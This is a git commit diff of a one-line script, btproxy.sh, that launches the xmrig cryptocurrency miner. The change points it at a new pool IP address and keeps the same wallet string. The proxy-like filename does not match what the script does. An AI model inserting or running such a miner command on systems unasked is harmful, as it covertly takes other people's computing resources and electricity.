7130df325e436769e6df556bd78c607ece1019fa
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2021-10-05 17:00:11 +0700

    Update btproxy.sh

--- btproxy.sh
+++ btproxy.sh
@@ -1,1 +1,1 @@
-./xmrig -o 52.187.73.48:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p 8bIEctOUOyONpS^vBmyDI3Qdq
+./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x
